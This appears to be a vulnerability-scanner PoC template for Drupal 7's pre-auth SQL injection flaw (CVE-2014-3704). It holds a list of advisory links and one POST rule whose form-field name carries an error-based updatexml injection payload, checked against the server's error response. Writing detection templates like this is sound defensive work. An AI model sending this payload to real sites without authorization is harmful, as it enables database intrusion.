name: yaml-poc-drupal-drupal-sql_injection-CVE-2014-3704
binding: 3c22d55c-da5c-403a-b7ef-701e7633aacc
detail:
    author: system_user
    links:
        - http://osvdb.org/show/osvdb/113371
        - http://packetstormsecurity.com/files/128720/Drupal-7.X-SQL-Injection.html
        - http://packetstormsecurity.com/files/128721/Drupal-7.31-SQL-Injection.html
        - http://packetstormsecurity.com/files/128741/Drupal-HTTP-Parameter-Key-Value-SQL-Injection.html
        - http://seclists.org/fulldisclosure/2014/Oct/75
        - http://secunia.com/advisories/59972
        - http://www.debian.org/security/2014/dsa-3051
        - http://www.exploit-db.com/exploits/34984
        - http://www.exploit-db.com/exploits/34992
        - http://www.exploit-db.com/exploits/34993
        - http://www.exploit-db.com/exploits/35150
        - http://www.openwall.com/lists/oss-security/2014/10/15/23
        - http://www.securityfocus.com/archive/1/533706/100/0/threaded
        - http://www.securityfocus.com/bid/70595
        - https://packetstormsecurity.com/files/128720/Drupal-7.X-SQL-Injection.html
        - https://packetstormsecurity.com/files/128721/Drupal-7.31-SQL-Injection.html
        - https://packetstormsecurity.com/files/128741/Drupal-HTTP-Parameter-Key-Value-SQL-Injection.html
        - https://www.debian.org/security/2014/dsa-3051
        - https://www.drupal.org/SA-CORE-2014-005
        - https://www.securityfocus.com/bid/70595
        - https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html
        - https://www.sektioneins.de/en/blog/14-11-03-drupal-sql-injection-vulnerability-PoC.html
    vulnerability:
        id: b35ff0c3-4497-4e41-a19e-dcb76f373406
        level: high
transport: http
set:
    rand: randomInt(200000000, 210000000)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /?q=node&destination=node
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0,concat(0xa,(select md5({{rand}}))),0)%23]=bob&name[0]=a
        expression: response.status == 500 && response.body.bcontains(bytes(substr(md5(string(rand)), 0, 31)))
expression: r0()
